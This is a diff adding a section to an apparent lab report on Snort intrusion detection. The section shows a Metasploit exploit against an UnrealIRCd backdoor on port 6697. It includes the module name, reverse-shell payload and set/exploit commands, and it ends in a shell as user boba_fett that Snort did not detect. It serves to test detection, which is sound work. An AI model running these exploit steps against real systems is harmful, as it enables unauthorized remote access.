@@ -118,8 +118,35 @@ uid=1111(leia_organa) gid=100(users) groups=100(users),27(sudo)
 
 This attack was not detected by Snort.
 
+###############################
+# Missed Attack 2: UnrealIRCd #
+###############################
 
+In the in-detail Nmap scan, an open port 6697 with the service IRC and version UnrealIRCd is identified. After a search on Metasploit only one exploit is found, exploit/unix/irc/unreal_ircd_3281_backdoor. The exploit shows multiple payloads available, for this case, we will use cmd/unix/reverse_ruby_ssl just to try. We set the IPs and execute the exploit:
 
+set RHOSTS 172.28.128.3
+SET LHOST 192.168.0.104
+exploit
 
+The following output is obtained:
 
+[*] Started reverse TCP double handler on 192.168.0.104:4444 
+[-] 172.28.128.3:6667 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (172.28.128.3:6667) timed out.
+[*] Exploit completed, but no session was created.
+
+We see that it is unreachable, this is because the port was not set properly, so we set the port to 6697 and execute the exploit again:
+
+set RPORT 6697
+exploit
+
+This time the attack succeeds and a command shell is obtained:
+
+[*] Command shell session 13 opened (192.168.0.104:4444 -> 192.168.0.104:43234) at 2023-11-19 23:50:18 +0200
+
+whoami
+boba_fett
+id
+uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
+
+We get shell although not with root privileges, but most surprisingly snort did not detect the attack.
 
